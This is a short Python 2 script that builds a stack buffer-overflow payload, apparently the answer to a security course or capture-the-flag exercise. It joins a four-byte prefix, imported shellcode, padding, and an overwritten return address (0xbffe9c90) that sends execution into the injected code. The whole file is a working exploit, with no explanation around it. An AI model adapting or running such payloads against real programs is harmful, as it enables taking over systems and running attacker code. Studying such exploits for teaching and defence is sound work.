from shellcode import shellcode
from struct import pack
print "\xff\xff\xff\xff" + shellcode + "a" * (0x3c - 23) + pack("<I", 0xbffe9c90)
